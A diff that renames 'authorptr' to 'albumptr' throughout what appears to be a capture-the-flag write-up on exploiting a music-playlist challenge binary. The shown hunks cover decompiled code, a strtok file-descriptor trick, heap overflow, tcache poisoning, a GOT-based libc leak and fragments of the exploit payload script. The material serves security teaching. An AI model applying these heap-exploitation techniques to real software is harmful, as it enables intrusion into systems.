@@ -198,7 +198,7 @@ Let's keep decompiling the `import_song()` function:
     exit(-1);
   }
   v1 = song_count;
-  *((_QWORD *)&authorptr + 7 * v1) = strtok((char *)&songs + 56 * song_count, "/");
+  *((_QWORD *)&albumptr + 7 * v1) = strtok((char *)&songs + 56 * song_count, "/");
   v2 = song_count;
   *((_QWORD *)&songtitleptr + 7 * v2) = strtok(0LL, ".");
   return __readfsqword(0x28u) ^ v5;
@@ -210,15 +210,15 @@ We can see that the program will read in 0x18 bytes from stdin to the location s
 * If the first character of the input is greater than 64 (`@`) and less than 91 (`[`), basically if the first character is a capital letter.
 * If the substrings flag and .. don't exist in the input.
 
-If any of these checks fail, the program will exit. Otherwise, it will call strtok two times to seperate out the directory and the text file file name (before the .txt extension) as seperate pointers, and store them in `(_QWORD *)&authorptr + 7 * v1)` and `(_QWORD *)&songtitleptr + 7 * v2)`, respectively, with `authorptr = 0x404080`, and `songtitleptr = 0x404088`.
+If any of these checks fail, the program will exit. Otherwise, it will call strtok two times to seperate out the directory and the text file file name (before the .txt extension) as seperate pointers, and store them in `(_QWORD *)&albumptr + 7 * v1)` and `(_QWORD *)&songtitleptr + 7 * v2)`, respectively, with `albumptr = 0x404080`, and `songtitleptr = 0x404088`.
 
 By looking at the decompilation, we can deduce that imported songs are stored in an array of some structure, where the array indexing occurs by modifying the `song_count` variable from earlier. As far as how the shape of the struct goes, so far we can conclude that it will look something like this:
 
 ```cpp=
 struct song {
     char filename[0x18]; //0x404078 (fd_offset) - 0x404060 (song)
-    uint64_t filedesc; //0x404080 (authorptr) - 0x404078 (fd_offset)
-    char * authorptr; //0x404088 (songtitleptr) - 0x404080 (authorptr)
+    uint64_t filedesc; //0x404080 (albumptr) - 0x404078 (fd_offset)
+    char * albumptr; //0x404088 (songtitleptr) - 0x404080 (albumptr)
     char * songptr; //?
     //maybe something more below?
 };
@@ -239,17 +239,17 @@ unsigned __int64 list_playlist()
   v2 = __readfsqword(0x28u);
   for ( i = 0; i < song_count; ++i )
   {
-    if ( *((_QWORD *)&authorptr + 7 * i) )
+    if ( *((_QWORD *)&albumptr + 7 * i) )
       printf(
         "%d. %s-%s\n",
         (unsigned int)(i + 1),
-        *((const char **)&authorptr + 7 * i),
+        *((const char **)&albumptr + 7 * i),
         *((const char **)&songtitleptr + 7 * i));
   }
   return __readfsqword(0x28u) ^ v2;
 }
 ```
-Looks like a fairly simple function! It's just a for loop that loops through each song from index 0 to `song_count - 1`, and if `song->authorptr (see struct diagram above)` isn't 0x0, it will print out the author and the song, along with a song ID.
+Looks like a fairly simple function! It's just a for loop that loops through each song from index 0 to `song_count - 1`, and if `song->albumptr (see struct diagram above)` isn't 0x0, it will print out the album and the song, along with a song ID.
 
 Let's look at `play_song()` next:
 ```clike=
@@ -273,12 +273,12 @@ unsigned __int64 play_song()
   __isoc99_scanf("%d", &v2);
   while ( getchar() != 10 )
     ;
-  if ( --v2 < song_count && v2 >= 0 && *((_QWORD *)&authorptr + 7 * v2) )
+  if ( --v2 < song_count && v2 >= 0 && *((_QWORD *)&albumptr + 7 * v2) )
   {
     printf(
       "You Selected: %s from %s\n",
       *((const char **)&songtitleptr + 7 * v2),
-      *((const char **)&authorptr + 7 * v2));
+      *((const char **)&albumptr + 7 * v2));
     if ( !*((_QWORD *)&song_content_ptr + 7 * v2) )
     {
       for ( i = 0; i <= 4; ++i )
@@ -332,7 +332,7 @@ This function's pretty complicated, so let's break it down. We'll first begin by
 This section of the code sets a 7 byte region around `nbytes` in the stack to 0, calls `list_playlist()`, and reads in a number to v2.
 
 ```clike=
-  if ( --v2 < song_count && v2 >= 0 && *((_QWORD *)&authorptr + 7 * v2) )
+  if ( --v2 < song_count && v2 >= 0 && *((_QWORD *)&albumptr + 7 * v2) )
   {
     ...
     ...
@@ -344,7 +344,7 @@ This section of the code sets a 7 byte region around `nbytes` in the stack to 0,
   return __readfsqword(0x28u) ^ v6;
 ```
 
-This section of the code (excluding the contents inside the if statement) checks if our selection's greater than or equal to 0, less than `song_count`, and if the respective `song->authorptr` that corresponds with our selection is not null. If either of these checks fail, the function returns immediately.
+This section of the code (excluding the contents inside the if statement) checks if our selection's greater than or equal to 0, less than `song_count`, and if the respective `song->albumptr` that corresponds with our selection is not null. If either of these checks fail, the function returns immediately.
 
 Now, let's look at what happens if all these checks succeed:
 
@@ -352,7 +352,7 @@ Now, let's look at what happens if all these checks succeed:
     printf(
       "You Selected: %s from %s\n",
       *((const char **)&songtitleptr + 7 * v2),
-      *((const char **)&authorptr + 7 * v2));
+      *((const char **)&albumptr + 7 * v2));
     if ( !*((_QWORD *)&song_content_ptr + 7 * v2) )
     {
       for ( i = 0; i <= 4; ++i )
@@ -373,15 +373,15 @@ Now, let's look at what happens if all these checks succeed:
     printf("%s", *((const char **)&song_content_ptr + 7 * v2));
 ```
 
-The program's going to print out the song name and author of the song we selected, and does a check on `(_QWORD *)&song_content_ptr + 7 * v2`, where `song_content_ptr=0x404090`, to see if that is null. If it is null, the program will read in 5 bytes from `song->filedesc` into the `nbytes` character array in the stack. The program will then convert the `nbytes` array into an unsigned integer and store the result in itself. Then, the program will allocate (using malloc)`nbytes + 1` bytes of memory to `(_QWORD *)&song_content_ptr + 7 * v2`, memsets `nbytes + 1` bytes of that buffer to 0x0, and reads in `nbytes` bytes from `song->filedesc` into `(_QWORD *)&song_content_ptr + 7 * v2`. The program then exits the if statement, and print out the contents of `(_QWORD *)&song_content_ptr + 7 * v2`.
+The program's going to print out the song name and album of the song we selected, and does a check on `(_QWORD *)&song_content_ptr + 7 * v2`, where `song_content_ptr=0x404090`, to see if that is null. If it is null, the program will read in 5 bytes from `song->filedesc` into the `nbytes` character array in the stack. The program will then convert the `nbytes` array into an unsigned integer and store the result in itself. Then, the program will allocate (using malloc)`nbytes + 1` bytes of memory to `(_QWORD *)&song_content_ptr + 7 * v2`, memsets `nbytes + 1` bytes of that buffer to 0x0, and reads in `nbytes` bytes from `song->filedesc` into `(_QWORD *)&song_content_ptr + 7 * v2`. The program then exits the if statement, and print out the contents of `(_QWORD *)&song_content_ptr + 7 * v2`.
 
 This tells us a lot of things. First, our initial guess of the `song` struct layout was incorrect, as the `song_content_ptr` is part of the layout. Our new `song` struct layout is the following:
 
 ```cpp=
 struct song {
     char filename[0x18]; //0x404078 (fd_offset) - 0x404060 (song)
-    uint64_t filedesc; //0x404080 (authorptr) - 0x404078 (fd_offset)
-    char * authorptr; //0x404088 (songtitleptr) - 0x404080 (authorptr)
+    uint64_t filedesc; //0x404080 (albumptr) - 0x404078 (fd_offset)
+    char * albumptr; //0x404088 (songtitleptr) - 0x404080 (albumptr)
     char * songptr; //0x404090 (song_content_ptr) - 0x404088 (songtitleptr)
     char * songcontentptr;
 }; //0x18 + 8 + 8 + 8 + 8 = 56 bytes in size
@@ -415,11 +415,11 @@ unsigned __int64 remove_song()
   __isoc99_scanf("%d", &v1);
   while ( getchar() != 10 )
     ;
-  if ( --v1 >= 0 && v1 < song_count && *((_QWORD *)&authorptr + 7 * v1) )
+  if ( --v1 >= 0 && v1 < song_count && *((_QWORD *)&albumptr + 7 * v1) )
   {
-    printf("Removing: %s from %s\n", *((const char **)&songtitleptr + 7 * v1), *((const char **)&authorptr + 7 * v1));
+    printf("Removing: %s from %s\n", *((const char **)&songtitleptr + 7 * v1), *((const char **)&albumptr + 7 * v1));
     *((_QWORD *)&songtitleptr + 7 * v1) = 0LL;
-    *((_QWORD *)&authorptr + 7 * v1) = 0LL;
+    *((_QWORD *)&albumptr + 7 * v1) = 0LL;
     free(*((void **)&song_content_ptr + 7 * v1));
     *((_QWORD *)&song_content_ptr + 7 * v1) = 0LL;
     memset((char *)&songs + 56 * v1, 0, 0x18uLL);
@@ -434,7 +434,7 @@ unsigned __int64 remove_song()
 }
 ```
 
-The beginning parts look similar to the `play_song()` function, where the program prints the playlist, reads a number, and does some checks to determine whether the `song->authorptr` pointer is not null. If it is not null, it's going to null out the the corresponding `song->songptr` and `song->songauthor` pointers, deallocates (by calling free()) and null out the `song->songcontentptr` pointer, memsetting all 0x18 bytes of `song->filename` character array, closes the `song->filedesc` file descriptor, and nulls it out as well.
+The beginning parts look similar to the `play_song()` function, where the program prints the playlist, reads a number, and does some checks to determine whether the `song->albumptr` pointer is not null. If it is not null, it's going to null out the the corresponding `song->songptr` and `song->songalbum` pointers, deallocates (by calling free()) and null out the `song->songcontentptr` pointer, memsetting all 0x18 bytes of `song->filename` character array, closes the `song->filedesc` file descriptor, and nulls it out as well.
 
 ## Tiktok to the strtok
 
@@ -472,7 +472,7 @@ Maybe this will help us. Let's look again to see what happens next, in `import_s
 
 ```clike=
   v1 = song_count;
-  *((_QWORD *)&authorptr + 7 * v1) = strtok((char *)&songs + 56 * song_count, "/"); //recall songs is the offset to song->filename
+  *((_QWORD *)&albumptr + 7 * v1) = strtok((char *)&songs + 56 * song_count, "/"); //recall songs is the offset to song->filename
   v2 = song_count;
   *((_QWORD *)&songtitleptr + 7 * v2) = strtok(0LL, ".");
   return __readfsqword(0x28u) ^ v5;
@@ -495,9 +495,9 @@ After `strtok()` returns, we get this:
 ```
               Scanner pointer
               v
-[Warrior[\x00]only.txt][song->filedesc][song->authorptr]
+[Warrior[\x00]only.txt][song->filedesc][song->albumptr]
  ^                                      |
- returned pointer (song->authorptr)------
+ returned pointer (song->albumptr)------
 
 Where [\x00] represents a null byte.
 ```
@@ -512,7 +512,7 @@ Since we're passing a null pointer as the first argument, `strtok()` will operat
 ```
                          Scanner pointer
                          v
-[Warrior[\x00]only[\x00]txt][song->filedesc][song->authorptr][song->songptr]
+[Warrior[\x00]only[\x00]txt][song->filedesc][song->albumptr][song->songptr]
  ^            ^                               |               |
  |            returned pointer (song->songptr)-----------------
  ---------------------------------------------|
@@ -527,9 +527,9 @@ After the first `strtok()` call:
 ```
               Scanner pointer
               v
-[Warrior[\x00]////][song->filedesc][song->authorptr]
+[Warrior[\x00]////][song->filedesc][song->albumptr]
  ^                                  |
- returned pointer (song->authorptr)--
+ returned pointer (song->albumptr)--
 ```
 
 Now, what happens if we do the second strtok call? Recall it's looking for the "." delimiter
@@ -537,9 +537,9 @@ Now, what happens if we do the second strtok call? Recall it's looking for the "
 ```
                                          Scanner pointer (somewhere in here since there's null bytes in 64 bit addresses)
                                          v
-[Warrior[\x00]////][song->filedesc][song->authorptr][song->songptr = NULL]
+[Warrior[\x00]////][song->filedesc][song->albumptr][song->songptr = NULL]
  ^                                  |
- returned pointer (song->authorptr)--
+ returned pointer (song->albumptr)--
 ```
 
 Hmmm....since there's no more '.' characters in the string, `strtok()` is likely going to return null. However, what if we're able to get `open()` to return the integer value of the '.' character as the file descriptor, which is 46?
@@ -547,7 +547,7 @@ Hmmm....since there's no more '.' characters in the string, `strtok()` is likely
 ```
                                              Scanner pointer
                                              v
-[Warrior[\x00]////][song->filedesc = [\x00]][song->authorptr][song->songptr]
+[Warrior[\x00]////][song->filedesc = [\x00]][song->albumptr][song->songptr]
  ^            ^                     |                         |
  |            returned pointer -----|-------------------------|
  ------------------------------------
@@ -1092,8 +1092,8 @@ Recall that the each of the song structs in the .bss section had the following l
 ```clike=
 struct song {
     char filename[0x18]; //0x404078 (fd_offset) - 0x404060 (song)
-    uint64_t filedesc; //0x404080 (authorptr) - 0x404078 (fd_offset)
-    char * authorptr; //0x404088 (songtitleptr) - 0x404080 (authorptr)
+    uint64_t filedesc; //0x404080 (albumptr) - 0x404078 (fd_offset)
+    char * albumptr; //0x404088 (songtitleptr) - 0x404080 (albumptr)
     char * songptr; //0x404090 (song_content_ptr) - 0x404088 (songtitleptr)
     char * songcontentptr;
 }; //0x18 + 8 + 8 + 8 + 8 = 56 bytes in size
@@ -1108,7 +1108,7 @@ Here are some of them:
 
 First, what is the GOT (Global Offset Table) table? This is the list of function pointers into libc for dynamically linked binaries, and it's located in a neighboring memory page to the .bss section. Since ASLR exists, dynamically linked binaries cannot hardcode the addresses of needed functions in libc, as these addresses change upon every execution. The global offset table is where libc updates where the needed functions are within libc during runtime, which solves the ASLR issue. Binaries can be compiled to have partial relro or full relro applied to the global offset table: partial relro means that the global offset table's location has changed relative to the .bss section but the table of function pointers is still writable, while full relro means that the global offset table of function pointers is read only.
 
-Initially, when I ran checksec on this program on my kali machine, its output told me that partial relro, not full relro was enabled. So, I first thought exploitation was easy: poison several tcaches to allocate memory in the .bss section where all the song structs are stored, and change the `song->authorptr` to the GOT entry of `atoi()`, and list the playlist to get the libc address of `atoi()`. I can then use the second poisoned tcache to allocate memory right over the global offset table entry of `atoi()`, and then edit the global offset table entry of `atoi()` to point to `system()` instead. At that time I moved into my Ubuntu 18.04 docker container, and running checksec indicated that the binary did have full relro enabled, so I cannot write to the GOT. Since I couldn't write to the GOT, I had already used up my ability to choose where I could place my next allocation from the libc leak, as I don't have the knowledge of where anything in libc is located when I poisoned the tcache. (otherwise I'd choose to poison the tcache with the address of `__free_hook()` instead). I can still leak the libc addresses from it though, which ended up being part of my final solution.
+Initially, when I ran checksec on this program on my kali machine, its output told me that partial relro, not full relro was enabled. So, I first thought exploitation was easy: poison several tcaches to allocate memory in the .bss section where all the song structs are stored, and change the `song->albumptr` to the GOT entry of `atoi()`, and list the playlist to get the libc address of `atoi()`. I can then use the second poisoned tcache to allocate memory right over the global offset table entry of `atoi()`, and then edit the global offset table entry of `atoi()` to point to `system()` instead. At that time I moved into my Ubuntu 18.04 docker container, and running checksec indicated that the binary did have full relro enabled, so I cannot write to the GOT. Since I couldn't write to the GOT, I had already used up my ability to choose where I could place my next allocation from the libc leak, as I don't have the knowledge of where anything in libc is located when I poisoned the tcache. (otherwise I'd choose to poison the tcache with the address of `__free_hook()` instead). I can still leak the libc addresses from it though, which ended up being part of my final solution.
 
 ### Dead end 2: Get a libc leak from the unsorted bin
 
@@ -1483,8 +1483,8 @@ We can now read 767 bytes into the location of song 4's `song->filedesc` value. 
 ```clike=
 struct song {
     char filename[0x18]; //0x404078 (fd_offset) - 0x404060 (song)
-    uint64_t filedesc; //0x404080 (authorptr) - 0x404078 (fd_offset)
-    char * authorptr; //0x404088 (songtitleptr) - 0x404080 (authorptr)
+    uint64_t filedesc; //0x404080 (albumptr) - 0x404078 (fd_offset)
+    char * albumptr; //0x404088 (songtitleptr) - 0x404080 (albumptr)
     char * songptr; //0x404090 (song_content_ptr) - 0x404088 (songtitleptr)
     char * songcontentptr;
 }; //0x18 + 8 + 8 + 8 + 8 = 56 bytes in size
@@ -1498,7 +1498,7 @@ Since these structs are laid out in an array, each song's struct is adjacent to 
 ------------------
 |                | <- song 4's filedesc
 ------------------
-|                | <- song 4's authorptr
+|                | <- song 4's albumptr
 ------------------
 |                | <- song 4's songptr
 ------------------
@@ -1510,12 +1510,12 @@ Since these structs are laid out in an array, each song's struct is adjacent to 
 ------------------
 |                | <- song 5's filedesc
 ------------------
-|                | <- song 5's authorptr
+|                | <- song 5's albumptr
 ------------------
         ...
 ```
 
-Recall also that when `list_playlist()` is called, the program prints out the strings (using `printf`) that are pointed to by the `song->authorptr` and `song->songptr`. We can overwrite these pointers to point to `atoi()` in the GOT table to get a libc leak! Finding the GOT location for `atoi()` can be done by running `objdump -d tiktok` utility, and looking at the .plt entry for `atoi()`, where the .plt entry is what a dynamically-linked program calls to jump to the libc address of the libc function.
+Recall also that when `list_playlist()` is called, the program prints out the strings (using `printf`) that are pointed to by the `song->albumptr` and `song->songptr`. We can overwrite these pointers to point to `atoi()` in the GOT table to get a libc leak! Finding the GOT location for `atoi()` can be done by running `objdump -d tiktok` utility, and looking at the .plt entry for `atoi()`, where the .plt entry is what a dynamically-linked program calls to jump to the libc address of the libc function.
 
 ![](https://i.imgur.com/1YMEaRy.png)
 
@@ -1528,7 +1528,7 @@ atoi_got = p64(0x403fd0)
 clobber = p64(0x0) #Set song 4's filedesc to 0
 ```
 
-We can then write the `song->authorptr` and `song->songptr` pointers to point to the GOT entry of `atoi`. After that we can write null values for the next 40 (or 0x28) bytes, which should cover song 4's `song->songcontentptr` which is 0x8 bytes long, song 5's `song->filename` region which is 0x18 bytes long, and song 5's `song->filedesc` region, which is 0x8 bytes long:
+We can then write the `song->albumptr` and `song->songptr` pointers to point to the GOT entry of `atoi`. After that we can write null values for the next 40 (or 0x28) bytes, which should cover song 4's `song->songcontentptr` which is 0x8 bytes long, song 5's `song->filename` region which is 0x18 bytes long, and song 5's `song->filedesc` region, which is 0x8 bytes long:
 
 ```python=
 clobber += atoi_got
@@ -1536,7 +1536,7 @@ clobber += atoi_got
 clobber += "\x00"*(5*8)
 ```
 
-Now, remember we need to do this for 767 bytes. However, since now we're back at the next song's `song->authorptr` region, we can loop this process. First, we need to know how much to loop. We can calculate this by computing `(767 - 8) / 56` rounded down, where the 8 is to account for the initial `clobber = p64(0x0)`, and the 56 is the size of the song struct. That expression is equal to 13, so we can loop through this 13 times:
+Now, remember we need to do this for 767 bytes. However, since now we're back at the next song's `song->albumptr` region, we can loop this process. First, we need to know how much to loop. We can calculate this by computing `(767 - 8) / 56` rounded down, where the 8 is to account for the initial `clobber = p64(0x0)`, and the 56 is the size of the song struct. That expression is equal to 13, so we can loop through this 13 times:
 
 ```python=
 for i in range(0, 13):
@@ -1545,7 +1545,7 @@ for i in range(0, 13):
         clobber += "\x00"*(5*8)
 ```
 
-There's still some leftover pieces of memory though, as 56 doesn't divide evenly to `767 - 8`. Therefore, we still need to fill `767 - 8 - (56 * 13)`or 31 bytes, which is enough to fill the next song's `song->authorptr` pointer, `song->songptr` pointer, and `31 - 16` amount of null bytes.
+There's still some leftover pieces of memory though, as 56 doesn't divide evenly to `767 - 8`. Therefore, we still need to fill `767 - 8 - (56 * 13)`or 31 bytes, which is enough to fill the next song's `song->albumptr` pointer, `song->songptr` pointer, and `31 - 16` amount of null bytes.
 
 Our final payload to clobber the .bss is the following:
 
@@ -1562,14 +1562,14 @@ for i in range(0, 13):
 clobber += atoi_got
 clobber += atoi_got
 clobber += "\x00"*(31-16)
-play_overflow("1", "767", clobber) #Song num 4-17's song->filedesc is set to 0, and their song author pointer points to atoi, which has atoi libc address
+play_overflow("1", "767", clobber) #Song num 4-17's song->filedesc is set to 0, and their song album pointer points to atoi, which has atoi libc address
 ```
 
 Let's put an `sh.interactive()` at the end to see what happens when view the playlist:
 
 ![](https://i.imgur.com/iGRF0tl.png)
 
-Looks like we're definitely leaking something! We can capture this leak by adding the following to our exploit, which captures song 15's author pointer's printed values (this was pretty arbitrary, ngl):
+Looks like we're definitely leaking something! We can capture this leak by adding the following to our exploit, which captures song 15's album pointer's printed values (this was pretty arbitrary, ngl):
 
 ```python
 atoi_libc = u64(list(6, "15. ").ljust(8, '\x00'))
@@ -1712,7 +1712,7 @@ This was an insane journey, so let's recap what we had to do to get a shell:
 1. Abuse an interaction with `open()` opening directories and `strtok()` null terminating delimiters to set a song's file descriptor to 0.
 2. Abuse an integer underflow to have the program read in way more than what was allocated, resulting in a heap overfow.
 3. Use the heap overflow to poison multiple tcache bins at once to get multiple arbitrary `malloc()`s, as well as increasing the `mchunk_size` header of small chunks so that they overlap
-4. Use the poisoned tcache to clobber the .bss section, and make the `song->authorptr` and `song->songptr` pointers point to the `atoi()` entry in the GOT table to get a leak.
+4. Use the poisoned tcache to clobber the .bss section, and make the `song->albumptr` and `song->songptr` pointers point to the `atoi()` entry in the GOT table to get a leak.
 5. Have the clobber also overwrite many other song's `song->filedesc` pointers so that we can write even more data
 6. Use the overlapped heap chunks to do a second tcache poisoning attack, to get `malloc()` to return a pointer to `__free_hook()`
 7. Overwrite `__free_hook()` with an one gadget address, and free a song to get a shell
@@ -1847,7 +1847,7 @@ for i in range(0, 13):
 clobber += atoi_got
 clobber += atoi_got
 clobber += "\x00"*(31-16)
-play_overflow("1", "767", clobber) #Song num 4-17's song->filedesc is set to 0, and their song author pointer points to atoi, which has atoi libc address
+play_overflow("1", "767", clobber) #Song num 4-17's song->filedesc is set to 0, and their song album pointer points to atoi, which has atoi libc address
 
 atoi_libc = u64(list(6, "15. ").ljust(8, '\x00'))
 log.success("Atoi in libc: " + hex(atoi_libc))
